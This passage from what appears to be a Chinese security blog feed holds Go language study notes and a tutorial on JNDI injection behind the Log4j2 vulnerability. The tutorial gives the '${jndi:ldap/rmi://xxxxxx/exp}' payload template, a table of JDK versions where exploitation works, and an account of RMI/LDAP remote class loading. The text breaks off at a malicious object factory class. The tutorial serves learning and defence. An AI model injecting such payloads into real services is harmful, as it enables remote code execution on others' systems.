class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">nums :=[]<span class="type">int</span>&#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>&#125;</span><br><span class="line"><span class="keyword">for</span> idx,val := <span class="keyword">range</span> nums&#123;</span><br><span class="line">fmt.Println(idx+<span class="number">1</span>,val)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-并发"><a href="#3-并发" class="headerlink" title="3. 并发"></a>3. 并发</h4><p>go拥有比其他语言更为简单的并发模型，可以使用<code>gorountine</code>并发执行代码，因其是可以同时运行的函数或者方法，<code>gorountine</code>被称为轻量级线程，于实际线程相比，创建他们的成本极低</p><p>可以通过在被调用的方法或者函数之前使用<code>go</code>关键字创建<code>gorountine</code>实现并发</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;f function&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> f()</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">fmt.Println(<span class="string">&quot;main function&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219124257.png"></p><p>在函数之前使用了<code>go</code>关键字，这将意味着程序同时运行f()和main()，换句话说：main()函数的执行将继续，而无需等待f()完成。当我们使用<code>time.Sleep</code>强制main函数暂停，以便f()可以执行完，如果不暂停main()函数，则该线程很可能在f()执行完毕之前就退出，将看不到其结果。</p><p>go 具有一种称为<code>通道</code>（channel）的数据类型，该数据类型提供了一个机制，通过该机制，<code>gorountine</code>可以同步执行函数并且这些函数可以互相通信。下面的例子显示使用一个通道时显示不用字符串的长度及其总和的示例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strlen</span><span class="params">(s <span class="type">string</span>, c <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">c &lt;- <span class="built_in">len</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">go</span> strlen(<span class="string">&quot;Salutations&quot;</span>,c)</span><br><span class="line"><span class="keyword">go</span> strlen(<span class="string">&quot;wolrd&quot;</span>,c)</span><br><span class="line">x,y := &lt;-c,&lt;-c</span><br><span class="line">fmt.Println(x,y,x+y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，定义并使用<code> chan int</code>类型的变量 c，你可以定义各种类型的通道，具体取决于通道传递的数据类型，你可以在<code>gorountine中</code>定义各种类型的通道，具体取决于要在通道传递的数据类型，上面的类型是要传递<code>int</code>类型的数据传长度。因此使用<code>int</code>类型的传递参数</p><p>请注意一个新的运算符，<code>&lt;-</code>。该运算符只是数据时流入还是流出通道，你可以这样理解他，”将物品放在桶里或者取出一个物品”</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219130532.png"></p><p>结果是<code>5,6,11</code>，可以理解为是一个栈，将最先放进去放到最底部，取出最后放入的，所以才会出现这种情况。</p><p>同时，从通道中取出数据则表明要取出足够的数据，否则会阻塞在这一行</p><h4 id="4-错误处理"><a href="#4-错误处理" class="headerlink" title="4. 错误处理"></a>4. 错误处理</h4><p>与大多数现代编程语言不同，Go 没有<code>try/catch/finally</code>错误的处理语法。但是，它使用了一种更为简单的方法，鼓励你多去检查哪些容易出现错误的地方，这样他们就不会聚焦在调用链中。</p><p>Go使用以下接口声明定义内置错误的类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着可以实现了方法Error()的任何数据类型，该方法返回字符串作为一个错误，例如，可以在代码中自定义错误</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;errors&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> myError <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e myError)</span></span>Error() <span class="type">string</span>  &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(e)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span></span> <span class="type">error</span>  &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;some Error Occurred&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">if</span> err := foo(); err !=<span class="literal">nil</span>&#123;</span><br><span class="line"><span class="comment">//处理错误的回显</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你会发现函数和方法至少返回一个值是很普遍的，并且这些值中总会又一个返回值是错误的，在Go中如果返回错误值是<code>nil</code>,则表明函数未出现任何问题。</p><blockquote><p>go 语言中没有形成统一的错误记录方法，原因之一是，与其他语言不同，Go的内置错误类型没有隐式包含堆栈跟踪以帮助查明错误的上下文或者位置，</p></blockquote><h4 id="5-处理结构化数据"><a href="#5-处理结构化数据" class="headerlink" title="5. 处理结构化数据"></a>5. 处理结构化数据</h4><p>安全从业人员会预先编好处理结构挂数据或者具有通用编码的数据，如<code>JSON</code>,<code>xml</code></p><p>最常见的两个包是<code>encoding/xml</code>和<code>encoding.json</code>，这两个包都可以组编和结组任意数据结构，这意味着他们可以将字符串转化为结构体，也可以将结构体序列化为字节切片，然后将字节切片反序列化为结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Foo02 <span class="keyword">struct</span> &#123;</span><br><span class="line">Bar <span class="type">string</span></span><br><span class="line">Baz <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f := Foo02&#123;<span class="string">&quot;h0ld1rs&quot;</span>,<span class="string">&quot;hello world&quot;</span>&#125;</span><br><span class="line">b,_ := json.Marshal(f)</span><br><span class="line">fmt.Println(<span class="type">string</span>(b))</span><br><span class="line">err := json.Unmarshal(b, &amp;f)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>json.Marshal 将struct 编码为<code>JSON</code>，返回一个字节切片，随后将其打印到标准输出，显示的是Json形式的字节码形式</p><p>json.Unmarshal(b,&amp;f)  将其进行解码，生成一个foo结构体实例。处理xml与此过程大致相同</p><p><a href="https://www.jianshu.com/p/da486be83e8a">https://www.jianshu.com/p/da486be83e8a</a></p>]]></content>
    
    
    <summary type="html">正在学习golang语言的一些笔记</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>JNDI入门</title>
    <link href="https://h0ld1rs.github.io/posts/3525.html"/>
    <id>https://h0ld1rs.github.io/posts/3525.html</id>
    <published>2022-01-27T16:19:21.000Z</published>
    <updated>2022-03-13T16:23:21.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JNDI入门指北"><a href="#JNDI入门指北" class="headerlink" title="JNDI入门指北"></a>JNDI入门指北</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>log4j2 宛如过年一般，趁此机会对没理清的  JNDI 协议仔细再捋一捋</p><p>log4j的payload很好记：<code>$&#123;jndi:ldap/rmi://xxxxxx/exp&#125;</code></p><p>那么，我们就需要研究一下是怎么来的。</p><p>首先来看rpc</p><h1 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h1><p>RPC即 <code>Remote Procedure Call</code>（远程过程调用），&#x3D;&#x3D;是一种技术思想而并非一种规范的协议&#x3D;&#x3D;，是一种通过网络从远程计算机请求服务的过程。</p><p>常见 RPC 技术和框架有：</p><ul><li>应用级的服务框架：阿里的 Dubbo&#x2F;Dubbox、Google gRPC、Spring Boot&#x2F;Spring Cloud。</li><li>远程通信协议：RMI、Socket、SOAP(HTTP XML)、REST(HTTP JSON)。</li><li>通信框架：MINA 和 Netty。</li></ul><p>一个rpc框架有以下必备条件：传输协议，序列化，注册中心，服务路由，负载均衡，IO框架，心跳机制，服务鉴权，服务隔离，服务治理，监控埋点。</p><ul><li>Dubbo：国内最早开源的 RPC 框架，由阿里巴巴公司开发并于 2011 年末对外开源，仅支持 Java 语言。</li><li>Motan：微博内部使用的 RPC 框架，于 2016 年对外开源，仅支持 Java 语言。</li><li>Tars：腾讯内部使用的 RPC 框架，于 2017 年对外开源，仅支持 C++ 语言。</li><li>Spring Cloud：国外 Pivotal 公司 2014 年对外开源的 RPC 框架，仅支持 Java 语言</li><li>gRPC：Google 于 2015 年对外开源的跨语言 RPC 框架，支持多种语言。</li><li>Thrift：最初是由 Facebook 开发的内部系统跨语言的 RPC 框架，2007 年贡献给了 Apache 基金，成为 Apache 开源项目之一，支持多种语言。</li></ul><h1 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h1><p>先直接给出结论</p><p><code>Spring Cloud是一种RPC框架，但是区别是它使用的是http协议的传输，整体技术和普通RPC如dubbo/thrift有很大区别，所以一般会分开说。</code></p><p>而Springcloud的核心是微服务，微服务中使用 RPC的思想尤为明显</p><p>我们熟知的一些漏洞，能够远程加载恶意类的，或多或少都有着使用微服务架构的影子，所以我们才需要对这一领域进行研究。</p><p><img src="https://pic3.zhimg.com/v2-cade4fe83bffcb193c05c68f63990c2e_b.jpg" alt="img"></p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li><p>在分布式场景中，我们一般要考虑调用问题</p></li><li><p>远程过程调用，要能够像本地过程调用一样方便，让使用者感受不到远程调用的逻辑</p></li><li><p>rpc的过程图</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1009724%2F201909%2F1009724-20190918170851529-1634452001.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643940372&t=ea8df0dfd0d97632c93a32d97dd5252f" alt="img"></p></li><li><p>RPC：(Remote Procedure call) 即远程过程调用，它是一个计算机通信协议，RPC与语言无关</p></li><li><p>RMI：(Remote Method Invocation) 远程方法执行，是RPC的纯java实现方式</p></li></ul><p>简单来说，就是一个节点请求另一个节点的服务</p><ol><li>服务端需要暴露一个接口 (让客户端知道服务端有哪些可以请求的服务)</li><li>客户端需要把调用方法名，参数都传递到服务端</li><li>服务端接收客户端发来的方法名和参数，在自己的服务中找到对应的方法，然后去调用</li><li>服务器端把结果发送到客户端</li></ol><p>通过网络传输字符串，对象等数据，使用时常伴随着序列化使用。</p><p>但是，光看这样，无法理解其中的细节，我们需要深入看一下RPC的架构</p><p><img src="http://i.zmofun.com/2021/04/19/03ba66223774d.png" alt="image.png"></p><p>在一个典型 RPC 的使用场景中，包含了服务发现、负载、容错、网络传输、序列化等组件，其中“RPC 协议”就指明了程序如何进行网络传输和序列化。(这个在后面的demo中会介绍到)</p><h1 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h1><p>参考文章：<a href="https://www.jianshu.com/p/7293b148028f">https://www.jianshu.com/p/7293b148028f</a></p><p>这里先谈一下微服务，什么是微服务</p><ol><li>微服务是系统架构上的一个风格，主旨是将一个原本独立的系统拆分成多个小型服务</li><li>这些小服务能够在各自独立的进程中运行，服务之间通过HTTP的 Restful API进行通信协作。</li></ol><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.d8jd.com%2FPublic%2Fuploads%2F201802%2F15183252168565.png&refer=http%3A%2F%2Fwww.d8jd.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643961705&t=2dac9932ea7dc73a23d5eba67959a390" alt="img"></p><p>比方说，一个服务里面，就有一个<code>apache + database</code>，</p><p>被拆分成的每一个小型服务都围绕着系统中的某一项或一些耦合度较高的业务功能进行构建，并且每个服务都维护着自身的数据存储、业务开发、自动化测试案例以及独立部署机制。</p><h2 id="为什么要使用微服务"><a href="#为什么要使用微服务" class="headerlink" title="为什么要使用微服务"></a>为什么要使用微服务</h2><p>微服务架构有别于更为传统的单体式方案，可将应用拆分成多个核心功能。&#x3D;&#x3D;每个功能都被称为一项服务，可以单独构建和部署，这意味着各项服务在工作（和出现故障）时不会相互影响&#x3D;&#x3D;。这有助于您更好实现 DevOps 的技术，让持续集成和持续交付(CI&#x2F;CD)[软件构造的知识点]更加利于实现。</p><p>按照官方的说法，实施微服务需要有：服务组件化，按业务阻止团队，做产品的态度，&#x3D;&#x3D;轻量化的通信机制&#x3D;&#x3D;，去中心化处理数据，去中心化管理数据，基础设施自动化，容错测试，容错设计，演进式设计。</p><p>其中，我们攻击具有JNDI漏洞的业务时，大部分是从轻量化的通信机制中入手的。</p><p>这里以微服务 zookeeper为例，看一下微服务的过程</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fstatic.zybuluo.com%2Fzhangnian88123%2Fs1glz9ip0513b06uyqs18rxp%2FQQ%25E6%2588%25AA%25E5%259B%25BE20160406183124.jpg&refer=http%3A%2F%2Fstatic.zybuluo.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643940871&t=2bfc85956cde9f3f996630d4fb78fec5" alt="img"></p><p>那么，我们伪造一个 微服务中间的服务器，类似于伪造JDBC反序列化漏洞中mysql服务端一样，让客户端访问恶意的服务器去加载数据，就可以达到我们的目的。</p><h3 id="关于jdk版本的问题"><a href="#关于jdk版本的问题" class="headerlink" title="关于jdk版本的问题"></a>关于jdk版本的问题</h3><p>师傅们经过测试，log4j给出了可以打的一些环境版本</p><p>总结是：<code>rmi 113之前可以用， ldap 191之前可以用</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">8u112 rmi可以利用</span><br><span class="line"></span><br><span class="line">8u112 ldap可以利用</span><br><span class="line"></span><br><span class="line">8u121 rmi失败</span><br><span class="line"></span><br><span class="line">8u121 ldap可以利用</span><br><span class="line"></span><br><span class="line">8u181 rmi失败</span><br><span class="line"></span><br><span class="line">8u181 ldap可以利用</span><br><span class="line"></span><br><span class="line">8u191 rmi失败</span><br><span class="line"></span><br><span class="line">8u191 ldap失败</span><br><span class="line"></span><br><span class="line">8u301 rmi失败</span><br><span class="line"></span><br><span class="line">8u301 ldap失败</span><br><span class="line"></span><br><span class="line"><span class="number">11.012</span> rmi失败</span><br><span class="line"></span><br><span class="line"><span class="number">11.012</span> ldap失败</span><br></pre></td></tr></table></figure><h2 id="那么，为什么191和113是一个分水岭呢？"><a href="#那么，为什么191和113是一个分水岭呢？" class="headerlink" title="那么，为什么191和113是一个分水岭呢？"></a>那么，为什么191和113是一个分水岭呢？</h2><p>我们先来分析一个例子</p><h3 id="LDAP-JNDI远程加载恶意类"><a href="#LDAP-JNDI远程加载恶意类" class="headerlink" title="LDAP+JNDI远程加载恶意类"></a>LDAP+JNDI远程加载恶意类</h3><p>ldap的jndi在&#x3D;&#x3D;6u211、7u201、8u191、11.0.1&#x3D;&#x3D;后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false，并且这些变动对应的分配了一个漏洞编号CVE-2018-3149。</p><p>这就是为什么师傅们说到191之后就不再适用了，因为如果我们想要在191之后的版本进行使用ldap进行加载恶意类，需要我们手动去设置参数<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为<code>true</code></p><p>具体可以见 Vulfocus 靶场环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09:latest </span><br></pre></td></tr></table></figure><p>中有代码这么写道</p><p>使用 docker copy 命令将 <code>demo.jar</code>拷贝到主机进行反编译</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212121439.png"></p><p>可以看到师傅在jdk版本不满足的情况下设置了属性为 true</p><p>接下来，我们以一张图来理清思路</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212122707.png"></p><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p><code>JNDI(Java Naming and Directory Interface)</code>是Java提供的<code>Java 命名和目录接口</code>。通过调用<code>JNDI</code>的<code>API</code>应用程序可以定位资源和其他程序对象。<code>JNDI</code>是<code>Java EE</code>的重要部分，需要注意的是它并不只是包含了<code>DataSource(JDBC 数据源)</code>，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p><p>JNDI如上很多协议，但是我们这里只分析 LDAP和RMI</p><h3 id="LDAP目录服务"><a href="#LDAP目录服务" class="headerlink" title="LDAP目录服务"></a>LDAP目录服务</h3><p>LDAP全称是轻量级目录访问协议。</p><p>LDAP的服务处理工厂类是:com.sun.jndi.ldap.LdapCtxFactory，连接LDAP之前需要配置好远程的LDAP服务。</p><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p><h2 id="远程加载恶意类-攻击服务端"><a href="#远程加载恶意类-攻击服务端" class="headerlink" title="远程加载恶意类(攻击服务端)"></a>远程加载恶意类(攻击服务端)</h2><h3 id="RMI服务端远程加载恶意类"><a href="#RMI服务端远程加载恶意类" class="headerlink" title="RMI服务端远程加载恶意类"></a>RMI服务端远程加载恶意类</h3><p>根据p师傅知识星球的内容可知rmi进行加载的时候，会涉及到<code>codebase</code>，codebase是一个地址，指定<code>jvm</code>从哪个地方去搜集类，和ClassPath，jdbc的url一样，通常是远程的URL，比如http,ftp等</p><p>如果我们指定<code>codebase=http://example.com</code>，然后加载<code>org.vulhub.example.Example</code>类，则宿主机上的jvm将会去下载<code>http://example.com/org.vulhub.example/Example.Class</code>，并作为要加载类的字节码。</p><p>在RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p><p>所以，我们只要控制了<code>codebase</code>，就可以加载任何恶意类。</p><p>在RMI中，我们是可以将<code>codebase</code>随着序列化的数据一起传输的，服务器在接受到数据后，就会去ClassPath和指定的codebase去寻找类。</p><h4 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h4><p>因此，官方在注意到后，在后面的版本加了限制，满足如下条件的才可以攻击</p><ol><li>安装并配置了<code>SecurityManager</code>，(需要自己设置为trust)</li><li>java.rmi.server.useCodebaseOnly 配置为 flase，如果为 true，则将禁用自动加载类文件，不允许远程加载对象</li></ol><blockquote><p>java在6u45、7u21，8u121，开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p></blockquote><h3 id="RMI-JNDI远程加载恶意类"><a href="#RMI-JNDI远程加载恶意类" class="headerlink" title="RMI+JNDI远程加载恶意类"></a>RMI+JNDI远程加载恶意类</h3><p>最典型的是 fastjson rmi+jndi注入。</p><p>被引用的ObjectFactory对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。</p><blockquote><p>rmi的jndi在6u132，7u122，8u113 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了false。</p><p><code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<br><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false</p></blockquote><h3 id="LDAP-JNDI远程加载恶意类-1"><a href="#LDAP-JNDI远程加载恶意类-1" class="headerlink" title="LDAP+JNDI远程加载恶意类"></a>LDAP+JNDI远程加载恶意类</h3><p>还是 fastjson ldap+jndi注入</p><blockquote><p>ldap的jndi在6u211、7u201、8u191、11.0.1后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false</p></blockquote><h3 id="JNDI注入之-rmi-jndi"><a href="#JNDI注入之-rmi-jndi" class="headerlink" title="JNDI注入之 rmi+jndi"></a>JNDI注入之 rmi+jndi</h3><p>如果我们再RMI服务端绑定一个恶意的引用对象，RMI 客户端在获取服务端绑定的对象的时候，发现是一个Reference对象后，检查当前JVM是否允许 (基于 trustURLCodebase)加载远程引用的对象，如果允许加载 Reference且本地不存在对象工厂类，则使用 URLClassLoader 加载远程的jar，去加载我们构建的恶意对象工厂(ReferenceeObjectFactory)类，然后调用其中的<code>getObjectInstance</code>方法从而触发方法中恶意RCE代码。</p><p>所以，如果当前RMI客户端允许加载远程调用的对象，且RMI服务端绑定的是<code>Referrnce</code>恶意对象，则可以进行RMI攻击</p><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>上面也说到了，对于jdk版本过高的，需要手动开启<code>trustURLCodebase=true</code>，不开启的话会提示<code>The Object factory is untrusted</code>    </p><h4 id="RMI-1"><a href="#RMI-1" class="headerlink" title="RMI"></a>RMI</h4><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212171126.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">列举几个函数</span><br><span class="line"></span><br><span class="line">bind：将远程对象绑定到注册中心</span><br><span class="line">rebind：重新绑定一个远程对象</span><br><span class="line">unbind：取消一个过程对象的绑定</span><br><span class="line">list：列出注册中心绑定对象</span><br><span class="line">lookup：在注册中心获取一个远程对象的存根</span><br></pre></td></tr></table></figure><h4 id="服务端与注册中心"><a href="#服务端与注册中心" class="headerlink" title="服务端与注册中心"></a>服务端与注册中心</h4><p>JRMP：客户端，服务端，注册中心三者之间的通信协议称为 JRMP协议</p><p>下面对一些常用的操作进行概括</p><p><strong>服务端与注册中心</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//默认是1099端口</span></span><br><span class="line">registry.bind(....);</span><br></pre></td></tr></table></figure><p>通过<code>getRegistry</code>方法获取到的其实是一个<code>RegistryImpl_Stub</code>的代理对象，其中封装了注册中心的一些TCP信息，用于与之发起请求</p><h3 id="JNDI注入前置"><a href="#JNDI注入前置" class="headerlink" title="JNDI注入前置"></a>JNDI注入前置</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>JNDI有多种命名&#x2F;目录提供的形式，所以客户端要<code>IntialContext</code>类来获取初始目录环境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/hello&quot;</span>;</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">context.lookup(url);</span><br></pre></td></tr></table></figure><p>JNDI会根据 url 的形式来动态解析，比如对于以RMI形式提供的服务，url就可以写成<code>rmi://&#123;ip&#125;:&#123;port&#125;/&#123;name&#125;</code>；对于LDAP的服务，url就可以写成 <code>ldap://&#123;ip&#125;:&#123;port&#125;/&#123;name&#125;</code></p><h4 id="JNDI注入的根–Reference"><a href="#JNDI注入的根–Reference" class="headerlink" title="JNDI注入的根–Reference"></a>JNDI注入的根–Reference</h4><p><code>Reference：在JNDI服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制</code></p><p>对于不存在命令&#x2F;目录范围内的对象，可以通过 Reference类来绑定一个外部的远程连接对象(一般以字节码形式通过http服务托管)，客户端可以通过lookup方法找到这个远程对象，获取相应的factory，然后通过factory将 reference转化成对象。</p><p>JNDI允许通过对象工厂(java.naming.spi.ObjectFactory)动态加载对象实现，例如，当查找绑定在名称空间中的打印机时，如果打印服务将打印机的名称绑定到<code>Reference</code>，则可以使用该打印机 Reference创建一个打印机对象，从而查找的调用者可以在查找后直接在该打印机对象上操作。</p><p>&#x3D;&#x3D;对象工厂必须实现 javax.naming.spi.ObjectFactory 接口，并且重写 getObjectInstance方法&#x3D;&#x3D;</p><p>所以我们这里就可以自己实现一个OjbectFactory接口的类，并重写getObjectInstance方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferenceObjectFactory</span> 